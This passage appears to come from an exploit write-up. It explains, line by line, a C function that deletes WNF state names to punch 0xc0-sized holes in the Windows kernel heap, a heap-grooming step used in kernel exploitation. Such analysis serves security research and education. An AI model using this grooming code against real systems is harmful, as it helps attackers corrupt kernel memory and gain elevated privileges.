Return to Top We start our analysis of the fragment_heap function by reviewing the function arguments and return type: NTSTATUS fragment_heap(_Inout_ PWNF_STATE_NAME statenames, _In_ UINT64 count) The fragment_heap function returned an NTSTATUS value depending on the success of the function's execution. The first argument, statenames, is a modifiable pointer of type PWNF_STATE_NAME, whose type definition is below: typedef struct _WNF_STATE_NAME
{ ULONG Data[2];
} WNF_STATE_NAME, *PWNF_STATE_NAME, *PCWNF_STATE_NAME; Next, the variable count is a read-only unsigned 64-bit integer which specifies the amount of holes created of size 0xc0 in the heap. Let's now look at the two variable definitions: NTSTATUS status = STATUS_SUCCESS;
UINT64 counter = 0; First, we see that status is of type NTSTATUS, the same as the return value for fragment_heap and is initialized with the value STATUS_SUCCESS. Finally, we have the unsigned 64-bit integer counter which is initially set to 0. With the variable definitions out of the way, let's review the main body of fragment_heap, which is a for loop used to iteratively delete WNF structures in the heap: for (int i = 0; i < count; i += 3) { // create holes status = _NtDeleteWnfStateData(&(statenames[i]), NULL); if (!NT_SUCCESS(status)) { log_warn("fragment_heap::_NtDeleteWnfStateData()1"); goto out; } status = _NtDeleteWnfStateName(&(statenames[i])); if (!NT_SUCCESS(status)) { log_warn("fragment_heap::_NtDeleteWnfStateData()1"); goto out; } statenames[i].Data[0] = 0; statenames[i].Data[1] = 0; counter++;
} The for loop iterates by a step of 3 to a maximum value specified through the input parameter count. For each iteration, the address of the statenames entry at index i is provided to both NtDeleteWnfStateData and NtDeleteWnfStateName. If both calls are successful, the Data member at the ith index is set to 0 at both the 0 and 1 subindex. The counter value is then incremented. printf("[+] Created 0x%llx holes of 0xc0 size in the heap\n", counter * 2); out: return status; Once the loop completes or is terminated, the status is then returned to the callee.

